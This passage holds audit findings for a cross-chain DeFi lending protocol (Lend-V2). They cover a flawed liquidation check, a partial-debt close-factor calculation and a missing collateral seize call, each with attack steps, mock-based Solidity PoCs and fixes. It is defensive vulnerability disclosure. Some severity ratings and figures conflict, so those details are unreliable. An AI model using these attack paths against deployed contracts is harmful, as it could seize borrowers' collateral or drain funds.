    LTokenInterface(params.borrowedlToken).repayBorrowBehalf(borrower, repayAmount);

    // Update borrower's crossChainCollaterals (simplified for brevity)
    // Logic to reduce borrowPrinciple and update storedBorrowIndex

    _executeLiquidation(params);
}
```



<br>
<br>
<br>



# Incorrect Liquidation Validation Leading to Unauthorized Liquidations in CrossChainRouter.sol contracts

### Summary

**High**

This vulnerability enables unauthorized liquidations of healthy borrower positions, resulting in unjust collateral seizures and potential financial losses for borrowers.

### Affected Components

**File:** `CrossChainRouter.sol`
**Function:** `_checkLiquidationValid(LZPayload memory payload)`
**Location:** Called within `_lzReceive` when `contractType == CrossChainLiquidationExecute`

  - [CrossChainRouter.sol\#L742-L785](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L742-L785)
  - [CrossChainRouter.sol\#L431-L436](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L431-L436)

-----

## Severity

**Critical** - This vulnerability enables unauthorized liquidations of healthy borrower positions, resulting in unjust collateral seizures and potential financial losses for borrowers.

-----

## Description

The `_checkLiquidationValid` function in `CrossChainRouter.sol` incorrectly assesses liquidation eligibility on Chain A (the source chain). It misuses the `getHypotheticalAccountLiquidityCollateral` function by passing the `payload.amount` (the number of collateral tokens to seize) as the `borrowAmount` parameter. This simulates an increase in borrowing rather than evaluating the actual health of the borrower’s position, allowing liquidations to proceed erroneously for healthy accounts when the seize amount is sufficiently large.

### Root Cause

The function uses the following logic:

```solidity
function _checkLiquidationValid(LZPayload memory payload) private view returns (bool) {
    (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
        payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
    );
    return borrowed > collateral;
}
```

  - `payload.amount` represents the collateral tokens to seize, but it is incorrectly passed as `borrowAmount`, simulating an additional borrow.
  - This misrepresentation causes the check to pass when it shouldn’t, as it doesn’t reflect the borrower’s actual debt-to-collateral ratio.

### Internal Pre-conditions

  - A borrower has a position with collateral and borrows across chains.
  - A liquidator sends a cross-chain liquidation message with a large `seizeTokens` value (`payload.amount`).
  - The borrower’s position is healthy (borrow value is below the collateral’s liquidation threshold).

### External Pre-conditions

  - None

-----

## Attack Path

An attacker can liquidate a healthy borrower position as follows:

**Initial Setup**

  - **Borrower’s position:**
      - Collateral: 200 tokens (valued at 200 USD).
      - Borrowed: 100 tokens (valued at 100 USD).
      - Liquidation threshold: 80% (position is healthy: 100 \< 200 \* 0.8 = 160).

**Exploit Steps**

1.  **Liquidation Attempt:**
      - Liquidator initiates a cross-chain liquidation with `seizeTokens` = 150.
2.  In `_lzReceive`, `contractType == CrossChainLiquidationExecute` triggers `_checkLiquidationValid`.
3.  The function simulates:
      - `borrowed` = 100 (existing) + 150 (`payload.amount`) = 250 USD.
      - `collateral` = 200 USD.
4.  Check: 250 \> 200 → `true`, liquidation is incorrectly approved.

**Result:**

  - The liquidation proceeds via `_handleLiquidationExecute`, seizing 150 tokens of collateral.
  - The borrower loses collateral despite a healthy position.

-----

## Impact

  - **Incorrect Liquidation Decisions:** The faulty logic in `_checkLiquidationValid` can lead to incorrect outcomes:
      - It might return `true` (validating the liquidation) for a position that should not be liquidated. This could lead to unauthorized/unfair liquidations.
      - Conversely, it might return `false` (rejecting the liquidation) when the liquidation is indeed valid, preventing legitimate liquidations from occurring and potentially leaving the protocol with bad debt.
  - **Protocol Destabilization:** Consistently making incorrect liquidation decisions can harm borrowers and undermine confidence in the protocol's stability and fairness.

-----

## PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface LToken {
    function getUnderlyingPrice() external view returns (uint256);
}

contract VulnerableCrossChainRouter {
    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    function _checkLiquidationValid(LZPayload memory payload) public view returns (bool) {
        (uint256 borrowed, uint256 collateral) = getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payload.destlToken), 0, payload.amount
        );
        return borrowed > collateral;
    }

    function getHypotheticalAccountLiquidityCollateral(
        address account,
        LToken lTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) public view returns (uint256, uint256) {
        // Mocked for PoC: assume borrow = 100, collateral = 200
        uint256 sumBorrowPlusEffects = 100 ether + borrowAmount;
        uint256 sumCollateral = 200 ether;
        return (sumBorrowPlusEffects, sumCollateral);
    }
}

contract PoCTest is Test {
    VulnerableCrossChainRouter public router;
    address public borrower = address(0x1);
    address public lToken = address(0x2);
    uint256 public seizeAmount = 150 ether;

    function setUp() public {
        router = new VulnerableCrossChainRouter();
    }

    function testIncorrectLiquidationValidation() public {
        VulnerableCrossChainRouter.LZPayload memory payload = VulnerableCrossChainRouter.LZPayload({
            amount: seizeAmount,
            borrowIndex: 0,
            collateral: 0,
            sender: borrower,
            destlToken: lToken,
            liquidator: address(0x3),
            srcToken: address(0x4),
            contractType: 0
        });
        bool isValid = router._checkLiquidationValid(payload);
        assertTrue(isValid, "Liquidation should incorrectly pass for a healthy position");
    }
}
```

### Running the PoC

**Steps:**

1.  Save as `IncorrectLiquidationValidationPoC.sol` in a Foundry project’s test directory.
2.  Run: `forge test --match-path test/IncorrectLiquidationValidationPoC.sol -vvvv`.
    The test demonstrates that a healthy position (100 borrowed, 200 collateral) is incorrectly flagged for liquidation.

-----

## Mitigation

Revise `_checkLiquidationValid` to evaluate the actual position health using the liquidation threshold, without simulating an incorrect borrow increase.

### Suggested Fix

```solidity
function _checkLiquidationValid(LZPayload memory payload) private view returns (bool) {
    (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
        payload.sender, LToken(payable(payload.destlToken)), 0, 0
    );
    uint256 liquidationThreshold = LendtrollerInterfaceV2(lendtroller).liquidationIncentiveMantissa();
    return borrowed > mul_(collateral, Exp({mantissa: liquidationThreshold}));
}
```

### Why This Works

It ensures only genuinely undercollateralized positions (where debt exceeds the threshold-adjusted collateral) are liquidated.



<br>
<br>
<br>




# Inconsistent Borrow Balance Calculation in CrossChainRouter.sol

## Summary

**Severity:** High
**Location:** `CrossChainRouter.sol::_prepareLiquidationValues`
**Description:** The borrow balance calculation in `_prepareLiquidationValues` only considers a specific cross-chain borrow position, ignoring same-chain borrows or additional cross-chain borrows of the same asset. This leads to an inaccurate representation of the borrower's total debt, potentially causing premature or unfair liquidations.

[Link to code](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L235-L262)

-----

## Root Cause

Imagine a user has borrowed USDC from a lending protocol in a few different ways (some directly, some cross-chain). Now, their loan is risky and needs to be partially repaid by a liquidator.

**The Goal:** The protocol has a rule (the "close factor," say 50%) that decides the maximum amount of USDC a liquidator can repay at once. This maximum should be 50% of the user's **total** USDC debt.

**The Problem Function:** A function called `_prepareLiquidationValues` is responsible for calculating this maximum repayable amount (`maxLiquidation`).

**The Flaw:**

  * To calculate `maxLiquidation`, the function first figures out the current value of the user's USDC debt (`currentBorrow`).
  * However, it seems to use information (`params.borrowPrinciple`) that only looks at **one specific piece** of the user's total USDC debt (e.g., just one of their cross-chain USDC loans), instead of adding up all their USDC debts.
  * So, the `currentBorrow` value it calculates is only for that single piece of the debt, not the user's total USDC debt.

**The Consequence:**

  * Because the function uses this smaller, partial debt amount to calculate `maxLiquidation`, the resulting `maxLiquidation` is also smaller than it should be.
  * For example, if the user owes a total of 1000 USDC, `maxLiquidation` should be 500 USDC (50% of 1000). But if the function only sees a piece of the debt worth 200 USDC, it will incorrectly calculate `maxLiquidation` as 100 USDC (50% of 200).

> In a nutshell: The function `_prepareLiquidationValues` incorrectly calculates the maximum amount a liquidator can repay because it looks at only a part of the user's debt for a specific asset, instead of their total debt for that asset. This makes liquidations less effective because liquidators can't repay as much as the protocol intends in one go, which can slow down the process of managing risky loans.

-----

## Internal Pre-conditions

  * **Fragmented Borrower Debt:**

      * The borrower must have an outstanding debt in the specific asset being liquidated (`params.borrowedlToken`'s underlying) that is composed of multiple distinct records or "legs."
      * Crucially, the `params.borrowPrinciple` and `params.storedBorrowIndex` (which are inputs to `_prepareLiquidationValues`) must represent the principal and index of **only one** of these debt components, not the sum total.
      * **Example:** A borrower owes a total of 1000 USDC. This could be 600 USDC from a specific cross-chain borrow (this 600 is `params.borrowPrinciple`) and another 400 USDC from a same-chain borrow (or a different cross-chain borrow of USDC).

  * **Active `closeFactorMantissa`:**

      * The lendtroller contract must have a `closeFactorMantissa` configured (e.g., 0.5 for 50%). This factor is used to calculate `maxLiquidation` based on the `currentBorrow`.

-----

## External Pre-conditions

  * **Borrower Eligibility for Liquidation:**

      * The borrower's overall account health (total value of all their debts versus total value of all their collateral, considering collateral factors and liquidation thresholds) must be such that they are actually eligible for liquidation. The `_prepareLiquidationValues` function itself doesn't check this; it assumes the decision to proceed with trying to liquidate is already valid.

  * **Liquidator Action:**

      * An external entity (a liquidator) must initiate a liquidation transaction.
      * This transaction would specify the borrower, the `borrowedAsset` to repay, and the `lTokenCollateral` to seize. These inputs would lead the system to identify the specific `params.borrowPrinciple` associated with that borrower/borrowed asset/collateral pair.

-----

## Attack Path

> **Borrower (Bob):**
>
>   * **Cross-chain borrow:** 1,000 USDC on Chain B, secured by lDAI collateral on Chain A.
>   * **Same-chain borrow:** 500 USDC on Chain B, secured by separate collateral on Chain B.
>
> **Current Behavior:** `_prepareLiquidationValues` calculates `currentBorrow` = 1,000 USDC, ignoring the additional 500 USDC same-chain borrow.
>
> **Total Debt:** Bob’s actual debt is 1,500 USDC, but the function only sees 1,000 USDC.
>
> **Liquidation:** A liquidator (Dave) can repay 400 USDC (based on the close factor applied to 1,000 USDC) and seize collateral from Chain A, even if Bob’s overall position (considering total collateral) might still be healthy.

-----

## Impact

  * **Reduced Liquidation Efficiency:** If `maxLiquidation` is calculated based on a partial debt amount, it will be smaller than what the protocol's `closeFactor` intends to allow. For example, if total current USDC debt is 1500, `closeFactor` is 0.5, then `maxLiquidation` should be 750. But if `params.borrowPrinciple` leads to a `currentBorrow` of only 1000 for the targeted leg, `maxLiquidation` would be incorrectly calculated as 500.
  * **Slower Deleveraging of Risky Positions:** Liquidators can only chip away at the debt in smaller amounts than intended. This can be problematic if a position is significantly underwater, requiring more transactions and potentially making liquidation uneconomical if the allowed `repayAmount` becomes too small.
  * **Potential for Stagnant Bad Debt:** If liquidation is inefficient, bad debt might accrue or persist longer than necessary, impacting protocol health.
  * **Inconsistent Application of `closeFactor`:** The `closeFactor` rule is not being applied consistently to the borrower's total liability in the asset being liquidated.

-----

## PoC

The following PoC demonstrates the vulnerability using a simplified version of the `CrossChainRouter` contract in Solidity. It simulates a borrower with both cross-chain and same-chain borrows and shows how the liquidation calculation ignores the total debt.

```solidity
pragma solidity 0.8.23;

contract LTokenMock {
    uint256 public borrowIndex;
    constructor() {
        borrowIndex = 1e18; // Initial borrow index (1.0)
    }
    function accrueInterest() external {
        borrowIndex = borrowIndex * 11 / 10; // Simulate 10% interest accrual
    }
}

contract CrossChainRouterPoC {
    LTokenMock public borrowedlToken;
    uint256 public constant CLOSE_FACTOR = 4e17; // 40%

    struct LiquidationParams {
        address borrowedlToken;
        uint256 borrowPrinciple;
        uint256 storedBorrowIndex;
        address borrower;
        uint256 repayAmount;
    }

    // Simulated storage for borrow balances
    mapping(address => mapping(address => uint256)) public crossChainBorrows;
    mapping(address => mapping(address => uint256)) public sameChainBorrows;

    constructor(address _borrowedlToken) {
        borrowedlToken = LTokenMock(_borrowedlToken);
    }

    // Simulate setting up borrows
    function setupBorrows(address borrower, uint256 crossChainAmount, uint256 sameChainAmount) external {
        crossChainBorrows[borrower][address(borrowedlToken)] = crossChainAmount;
        sameChainBorrows[borrower][address(borrowedlToken)] = sameChainAmount;
    }

    // Vulnerable liquidation function
    function executeLiquidation(LiquidationParams memory params) external {
        uint256 maxLiquidation = prepareLiquidationValues(params);
        require(params.repayAmount <= maxLiquidation, "Exceeds max liquidation");
        // Simulate liquidation logic (not implemented for brevity)
    }

    function prepareLiquidationValues(LiquidationParams memory params) private returns (uint256) {
        borrowedlToken.accrueInterest();
        uint256 currentBorrowIndex = borrowedlToken.borrowIndex();
        
        // Only considers specific cross-chain borrow position
        uint256 currentBorrow = (params.borrowPrinciple * currentBorrowIndex) / params.storedBorrowIndex;
        
        // Calculate max liquidation amount (vulnerable: ignores total debt)
        return (currentBorrow * CLOSE_FACTOR) / 1e18;
    }

    // Helper function to simulate total debt (for comparison)
    function getTotalBorrow(address borrower) external view returns (uint256) {
        uint256 crossChainDebt = crossChainBorrows[borrower][address(borrowedlToken)];
        uint256 sameChainDebt = sameChainBorrows[borrower][address(borrowedlToken)];
        return crossChainDebt + sameChainDebt;
    }
}

contract PoCTest {
    CrossChainRouterPoC public router;
    LTokenMock public lToken;

    constructor() {
        lToken = new LTokenMock();
        router = new CrossChainRouterPoC(address(lToken));
    }

    function testVulnerability() external {
        address bob = address(0x1);
        
        // Setup: Bob borrows 1,000 USDC cross-chain and 500 USDC same-chain
        router.setupBorrows(bob, 1000e18, 500e18);

        // Liquidation params for cross-chain borrow only
        CrossChainRouterPoC.LiquidationParams memory params = CrossChainRouterPoC.LiquidationParams({
            borrowedlToken: address(lToken),
            borrowPrinciple: 1000e18, // Cross-chain borrow principal
            storedBorrowIndex: 1e18,  // Initial borrow index
            borrower: bob,
            repayAmount: 440e18       // Attempt to repay 440 USDC (after interest)
        });

        // Execute liquidation (should succeed based on partial debt)
        router.executeLiquidation(params);

        // Check total debt (for reference)
        uint256 totalDebt = router.getTotalBorrow(bob);
        assert(totalDebt == 1500e18); // Total debt is 1,500 USDC, but liquidation only saw 1,000 USDC
    }
}
```

### Running the PoC

1.  Deploy the `PoCTest` contract.
2.  Call `testVulnerability()` to simulate the scenario:
      * Bob has 1,000 USDC cross-chain and 500 USDC same-chain borrows.
      * After interest accrual (10%), the cross-chain borrow becomes 1,100 USDC.
      * `maxLiquidation` is calculated as 40% of 1,100 USDC = 440 USDC.
      * Liquidation succeeds for 440 USDC, ignoring the total debt of 1,500 USDC.
3.  This demonstrates that the liquidation proceeds based on an incomplete debt assessment, potentially allowing premature liquidation.

-----

## Mitigation

To fix this vulnerability, modify `_prepareLiquidationValues` to calculate the borrower’s total debt across all borrow positions for the same asset, ensuring liquidation reflects the overall health of the borrower’s position.

### Proposed Fix

```solidity
function _prepareLiquidationValues(LendStorage.LiquidationParams memory params)
    private
    returns (uint256 maxLiquidation)
{
    LTokenInterface(params.borrowedlToken).accrueInterest();
    uint256 currentBorrowIndex = LTokenInterface(params.borrowedlToken).borrowIndex();

    // Calculate total borrow balance for the borrower
    uint256 totalBorrow = getTotalBorrowBalance(params.borrower, params.borrowedlToken);
    
    maxLiquidation = mul_ScalarTruncate(
        Exp({mantissa: LendtrollerInterfaceV2(lendtroller).closeFactorMantissa()}), totalBorrow
    );

    return maxLiquidation;
}

function getTotalBorrowBalance(address borrower, address borrowedlToken) private view returns (uint256) {
    // Sum all borrow balances (cross-chain and same-chain) for the asset
    uint256 totalBorrow = 0;
    // Add logic to retrieve and sum all borrow positions from lendStorage
    // Example: totalBorrow += lendStorage.getBorrowBalance(borrower, borrowedlToken);
    return totalBorrow;
}
```




<br>
<br>
<br>




# Borrower Retains Collateral Post-Liquidation

**Severity:** Medium

## Summary

A missing `seize` call in the `liquidateSeizeUpdate` function will cause the liquidator to not receive the collateral tokens, allowing the borrower to retain and potentially redeem the collateral post-liquidation.

-----

### Affected Code

  * [CoreRouter.sol\#L230-L244](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L230-L244)
  * [CoreRouter.sol\#L256-L276](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L256-L276)
  * [CoreRouter.sol\#L278-L318](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L278-L318)

-----

## Root Cause

In the `liquidateSeizeUpdate` function of `CoreRouter.sol`, there is a missing call to `LErc20Interface(lTokenCollateral).seize(sender, borrower, seizeTokens)`, which is required to transfer the collateral tokens from the borrower to the liquidator on the `lToken` contract.

### Internal Pre-conditions

A borrower has supplied collateral and borrowed assets, and their position becomes undercollateralized due to price changes. A liquidator initiates the liquidation by calling `liquidateBorrow`, which triggers `liquidateSeizeUpdate`.

### External Pre-conditions

The price of the collateral asset decreases or the price of the borrowed asset increases, making the borrower's position liquidatable.

-----

## Attack Path

1.  **Borrower's position becomes undercollateralized** due to external price changes.
2.  A **liquidator calls `liquidateBorrow`** to liquidate the borrower's position.
3.  The `liquidateSeizeUpdate` function executes, calculating `seizeTokens` and updating the internal `totalInvestment` state in `LendStorage`.
4.  Due to the **missing `seize` call**, the actual collateral tokens in the `lToken` contract are not transferred from the borrower to the liquidator.
5.  The **borrower retains their collateral tokens** and can still interact with them, such as redeeming or transferring them via the `lToken` contract.

-----

## Impact

This vulnerability risks the protocol's stability and trust, as the liquidation mechanism fails to enforce the transfer of collateral.

  * The **liquidator does not receive the collateral tokens** they are entitled to, undermining the economic incentive for performing liquidations.
  * The **borrower can exploit this** by redeeming or transferring the collateral tokens post-liquidation, effectively double-spending the collateral.

-----

## PoC

Below is a runnable Solidity test using Foundry to demonstrate the vulnerability. The test assumes simplified implementations of dependencies and focuses on the core issue.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface LTokenInterface {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function accrueInterest() external returns (uint256);
}

interface LendtrollerInterfaceV2 {
    function liquidateCalculateSeizeTokens(address borrowedlToken, address lTokenCollateral, uint256 repayAmount)
        external view returns (uint256, uint256);
}

contract LendStorageMock {
    mapping(address => mapping(address => uint256)) public totalInvestment;
    mapping(address => uint256) public protocolReward;
    uint256 public constant PROTOCOL_SEIZE_SHARE_MANTISSA = 5e16; // 5%

    function updateTotalInvestment(address user, address lToken, uint256 amount) external {
        totalInvestment[user][lToken] = amount;
    }

    function updateProtocolReward(address lToken, uint256 amount) external {
        protocolReward[lToken] = amount;
    }

    function distributeSupplierLend(address lToken, address user) external {}

    function underlyingTolToken(address underlying) external view returns (address) {
        return underlying; // Simplified for testing
    }

    function getHypotheticalAccountLiquidityCollateral(address account, LTokenInterface lToken, uint256 redeemTokens, uint256 borrowAmount)
        external view returns (uint256 borrowed, uint256 collateral) {
        return (500e6, 1000e18); // Mock values
    }
}

contract CoreRouterTest is Test {
    LendStorageMock lendStorage;
    address lDAI;
    address lUSDC;
    address DAI;
    address USDC;
    address coreRouter;
    address lendtroller;

    address borrower = address(1);
    address liquidator = address(2);

    function setUp() public {
        lendStorage = new LendStorageMock();
        lDAI = address(new MockLToken());
        lUSDC = address(new MockLToken());
        DAI = address(new MockERC20());
        USDC = address(new MockERC20());
        lendtroller = address(new MockLendtroller());
        coreRouter = address(new CoreRouter(address(lendStorage), address(0), lendtroller));

        vm.label(borrower, "Borrower");
        vm.label(liquidator, "Liquidator");
        vm.label(lDAI, "lDAI");
        vm.label(lUSDC, "lUSDC");
        vm.label(DAI, "DAI");
        vm.label(USDC, "USDC");
    }

    function testMissingSeizeCall() public {
        // Borrower supplies 1000 DAI and borrows 500 USDC
        vm.startPrank(borrower);
        IERC20(DAI).approve(lDAI, 1000e18);
        LTokenInterface(lDAI).mint(1000e18);
        LTokenInterface(lUSDC).borrow(500e6);
        vm.stopPrank();

        // Set up initial totalInvestment
        lendStorage.updateTotalInvestment(borrower, lDAI, 1000e18);

        // Liquidator liquidates 250 USDC of borrow
        vm.startPrank(liquidator);
        IERC20(USDC).approve(lUSDC, 250e6);
        (bool success, ) = coreRouter.call(
            abi.encodeWithSignature(
                "liquidateBorrow(address,uint256,address,address)",
                borrower,
                250e6,
                lDAI,
                USDC
            )
        );
        require(success, "Liquidation failed");
        vm.stopPrank();

        // Check internal state
        uint256 borrowerInvestment = lendStorage.totalInvestment(borrower, lDAI);
        uint256 liquidatorInvestment = lendStorage.totalInvestment(liquidator, lDAI);
        assertEq(borrowerInvestment, 700e18); // 1000 - 300 (assuming seizeTokens = 300e18)
        assertTrue(liquidatorInvestment > 0); // Liquidator should have some collateral

        // Check actual lDAI balances
        uint256 borrowerLDAIBalance = LTokenInterface(lDAI).balanceOf(borrower);
        assertEq(borrowerLDAIBalance, 1000e18); // Still 1000, not reduced

        // Borrower can still redeem
        vm.startPrank(borrower);
        LTokenInterface(lDAI).redeem(1000e18); // Should succeed, but shouldn't
        vm.stopPrank();
    }
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = 10000e18; // Fund deployer for simplicity
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract MockLToken is LTokenInterface {
    mapping(address => uint256) public balanceOf;
    uint256 totalSupply;

    function mint(uint256 mintAmount) external returns (uint256) {
        balanceOf[msg.sender] += mintAmount;
        totalSupply += mintAmount;
        return 0;
    }

    function borrow(uint256 borrowAmount) external returns (uint256) {
        return 0;
    }

    function redeem(uint256 redeemTokens) external returns (uint256) {
        require(balanceOf[msg.sender] >= redeemTokens, "Insufficient balance");
        balanceOf[msg.sender] -= redeemTokens;
        totalSupply -= redeemTokens;
        return 0;
    }

    function accrueInterest() external returns (uint256) {
        return 0;
    }
}

contract MockLendtroller is LendtrollerInterfaceV2 {
    function liquidateCalculateSeizeTokens(address, address, uint256)
        external view returns (uint256, uint256) {
        return (0, 300e18); // Mock: 300 lDAI seized for 250 USDC repaid
    }
}
```

### PoC Explanation

  * **Setup:** A borrower supplies 1000 DAI (via `lDAI`) and borrows 500 USDC (via `lUSDC`). Initial `totalInvestment` reflects this.
  * **Liquidation:** A liquidator repays 250 USDC, triggering `liquidateSeizeUpdate`. The mock lendtroller returns `seizeTokens` = 300e18.
  * **State Check:** `totalInvestment` updates (borrower: 700, liquidator: \~295 after reward), but `lDAI.balanceOf(borrower)` remains 1000.
  * **Exploit:** The borrower successfully redeems 1000 `lDAI`, despite the liquidation.

-----

## Mitigation

Add the following line in `liquidateSeizeUpdate` after calculating `seizeTokens` and before updating `totalInvestment`:

```solidity
require(LErc20Interface(lTokenCollateral).seize(sender, borrower, seizeTokens) == 0, "Seize failed");
```

  * Ensure the `seize` function in `LToken` correctly transfers tokens from the borrower to the liquidator.
  * Verify that internal state updates in `LendStorage` align with the actual token balances after the `seize` call succeeds.